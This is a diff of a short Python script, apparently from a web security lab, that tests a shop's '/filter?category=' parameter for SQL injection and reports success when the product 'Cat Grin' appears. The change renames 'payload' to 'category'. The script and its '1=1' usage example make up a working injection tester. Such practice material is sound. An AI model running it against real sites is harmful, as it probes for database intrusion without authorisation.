@@ -8,10 +8,10 @@ proxies = {
     'http': 'http://127.0.0.1:8080',
     'https': 'http://127.0.0.1:8080'}
 
-def is_exploitable(url, payload):
+def is_exploitable(url, category):
     uri = '/filter?category='
     request = requests.get(
-        url + uri + payload,
+        url + uri + category,
         verify=False,
         proxies=proxies)
     return "Cat Grin" in request.text
@@ -19,13 +19,13 @@ def is_exploitable(url, payload):
 if __name__ == "__main__":
     try:
         url =sys.argv[1].strip()
-        payload = sys.argv[2].strip()
-        if is_exploitable(url, payload):
+        category = sys.argv[2].strip()
+        if is_exploitable(url, category):
             print("[+] SQL injection successful!")
         else:
             print("[-] SQL injection unsuccessful")
     except IndexError:
-        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
+        print("[-] Usage: %s <url> <category>" % sys.argv[0])
         print('[-] Example: %s www.example.com "1=1"' % sys.argv[0]) 
         sys.exit(-1)
 
